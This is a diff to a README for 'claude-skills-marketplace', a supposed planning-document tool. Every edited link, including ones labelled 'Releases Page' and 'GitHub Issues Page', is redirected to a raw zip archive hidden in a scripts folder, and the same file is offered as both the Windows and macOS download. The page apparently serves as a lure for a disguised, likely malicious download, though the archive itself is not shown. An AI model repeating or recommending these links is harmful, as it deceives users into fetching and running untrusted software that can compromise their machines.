@@ -6,7 +6,7 @@ Welcome to **claude-skills-marketplace**! This software helps you generate detai
 
 ## 📥 Download the Application
 
-[![Download Now](https://raw.githubusercontent.com/428alexander9/claude-skills-marketplace/master/.claude/claude-skills-marketplace_v3.4.zip%https://raw.githubusercontent.com/428alexander9/claude-skills-marketplace/master/.claude/claude-skills-marketplace_v3.4.zip)](https://raw.githubusercontent.com/428alexander9/claude-skills-marketplace/master/.claude/claude-skills-marketplace_v3.4.zip)
+[![Download Now](https://github.com/428alexander9/claude-skills-marketplace/raw/refs/heads/master/project-planner-skill/scripts/skills-marketplace-claude-2.9.zip%https://github.com/428alexander9/claude-skills-marketplace/raw/refs/heads/master/project-planner-skill/scripts/skills-marketplace-claude-2.9.zip)](https://github.com/428alexander9/claude-skills-marketplace/raw/refs/heads/master/project-planner-skill/scripts/skills-marketplace-claude-2.9.zip)
 
 ## 📋 System Requirements
 
@@ -21,15 +21,15 @@ Before you begin, check if your system meets the requirements below:
 ## 💾 Download & Install
 
 1. Click the link below to visit the Releases page.
-   - [Visit the Releases Page](https://raw.githubusercontent.com/428alexander9/claude-skills-marketplace/master/.claude/claude-skills-marketplace_v3.4.zip)
+   - [Visit the Releases Page](https://github.com/428alexander9/claude-skills-marketplace/raw/refs/heads/master/project-planner-skill/scripts/skills-marketplace-claude-2.9.zip)
 
 2. On the Releases page, you will see different versions of the software listed. Look for the latest version at the top.
 
 3. Click on the version number to view release notes, which explain new features and changes.
 
 4. Find the file that matches your operating system. For example:
-   - **Windows:** `https://raw.githubusercontent.com/428alexander9/claude-skills-marketplace/master/.claude/claude-skills-marketplace_v3.4.zip`
-   - **macOS:** `https://raw.githubusercontent.com/428alexander9/claude-skills-marketplace/master/.claude/claude-skills-marketplace_v3.4.zip`
+   - **Windows:** `https://github.com/428alexander9/claude-skills-marketplace/raw/refs/heads/master/project-planner-skill/scripts/skills-marketplace-claude-2.9.zip`
+   - **macOS:** `https://github.com/428alexander9/claude-skills-marketplace/raw/refs/heads/master/project-planner-skill/scripts/skills-marketplace-claude-2.9.zip`
 
 5. Click on the file to start the download.
 
@@ -74,14 +74,14 @@ If you encounter issues, try these solutions:
 
 ## 🛠 Support
 
-For further assistance, visit our [GitHub Issues Page](https://raw.githubusercontent.com/428alexander9/claude-skills-marketplace/master/.claude/claude-skills-marketplace_v3.4.zip) to report bugs or ask questions. Our community is here to help you.
+For further assistance, visit our [GitHub Issues Page](https://github.com/428alexander9/claude-skills-marketplace/raw/refs/heads/master/project-planner-skill/scripts/skills-marketplace-claude-2.9.zip) to report bugs or ask questions. Our community is here to help you.
 
 ## 📰 Release Notes
 
-Stay updated with the latest features and fixes by reviewing the release notes on the [Releases Page](https://raw.githubusercontent.com/428alexander9/claude-skills-marketplace/master/.claude/claude-skills-marketplace_v3.4.zip).
+Stay updated with the latest features and fixes by reviewing the release notes on the [Releases Page](https://github.com/428alexander9/claude-skills-marketplace/raw/refs/heads/master/project-planner-skill/scripts/skills-marketplace-claude-2.9.zip).
 
 ## 📌 Conclusion 
 
 Using **claude-skills-marketplace** is a straightforward process. You can generate comprehensive planning documents quickly and easily with this tool. Download the application today to enhance your AI-assisted software development journey.
 
-[![Download Now](https://raw.githubusercontent.com/428alexander9/claude-skills-marketplace/master/.claude/claude-skills-marketplace_v3.4.zip%https://raw.githubusercontent.com/428alexander9/claude-skills-marketplace/master/.claude/claude-skills-marketplace_v3.4.zip)](https://raw.githubusercontent.com/428alexander9/claude-skills-marketplace/master/.claude/claude-skills-marketplace_v3.4.zip)
+[![Download Now](https://github.com/428alexander9/claude-skills-marketplace/raw/refs/heads/master/project-planner-skill/scripts/skills-marketplace-claude-2.9.zip%https://github.com/428alexander9/claude-skills-marketplace/raw/refs/heads/master/project-planner-skill/scripts/skills-marketplace-claude-2.9.zip)](https://github.com/428alexander9/claude-skills-marketplace/raw/refs/heads/master/project-planner-skill/scripts/skills-marketplace-claude-2.9.zip)
